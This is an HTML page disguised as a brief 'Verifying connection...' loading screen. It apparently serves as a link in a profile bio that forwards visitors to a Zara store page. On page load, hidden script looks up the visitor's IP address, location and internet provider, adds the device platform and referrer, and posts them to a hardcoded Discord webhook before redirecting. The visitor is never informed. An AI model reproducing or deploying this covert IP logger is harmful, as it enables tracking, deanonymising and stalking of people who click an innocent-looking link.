<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Connecting...</title>
<style>

        body {

            background-color: #0d1117; 

            margin: 0;

            display: flex;

            flex-direction: column;

            justify-content: center;

            align-items: center;

            height: 100vh;

            color: #58a6ff;

            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;

        }

        .loader {

            border: 3px solid #30363d;

            border-top: 3px solid #58a6ff;

            border-radius: 50%;

            width: 32px;

            height: 32px;

            animation: spin 0.8s linear infinite;

            margin-bottom: 15px;

        }

        .status-text {

            font-size: 14px;

            letter-spacing: 0.5px;

            opacity: 0.8;

        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
</style>
<script>

        async function logAndGo() {

            // --- CONFIGURATION ---

            const webhookURL = "https://discord.com/api/webhooks/1494944448767983697/KzHvXGmFkSIWds1vzdEDuySWPA6XuDyAwuddTBol9QJbaw5NLDjD_JdBp-LNWgizpBvC";

            const destination = "https://www.zara.com/my/";

            const timeoutDuration = 2500; // Force redirect after 2.5s if things hang

            // --- REDIRECT SAFETY NET ---

            const forceRedirect = setTimeout(() => {

                window.location.replace(destination);

            }, timeoutDuration);

            try {

                // 1. Grab IP and Location Data

                // Using a fallback mechanism if ipapi is down

                const response = await fetch('https://ipapi.co/json/').catch(() => null);

                const data = response ? await response.json() : { city: "Unknown", region: "Unknown", country_name: "Unknown", ip: "Hidden", org: "Unknown" };

                // 2. Construct Payload

                const logData = {

                    username: "Profile Sentry",

                    embeds: [{

                        title: "👤 New Visitor Detected",

                        description: "Link clicked via Profile Bio.",

                        color: 3447003,

                        fields: [

                            { name: "📍 Location", value: `${data.city}, ${data.region}, ${data.country_name}`, inline: false },

                            { name: "🌐 IP Address", value: `\`${data.ip}\``, inline: true },

                            { name: "🔌 Provider", value: data.org, inline: true },

                            { name: "📱 Device", value: navigator.platform, inline: true },

                            { name: "🔗 Referrer", value: document.referrer || "Direct/Private", inline: true }

                        ],

                        footer: { text: "System Active" },

                        timestamp: new Date()

                    }]

                };

                // 3. Send to Discord

                // 'keepalive: true' ensures the request finishes even if the page closes/redirects

                await fetch(webhookURL, {

                    method: 'POST',

                    headers: { 'Content-Type': 'application/json' },

                    body: JSON.stringify(logData),

                    keepalive: true 

                });

            } catch (err) {

                console.error("Logger error:", err);

            } finally {

                // 4. Final Redirect

                clearTimeout(forceRedirect);

                window.location.replace(destination);

            }

        }

        window.onload = logAndGo;
</script>
</head>
<body>
<div class="loader"></div>
<div class="status-text">Verifying connection...</div>
</body>
</html>
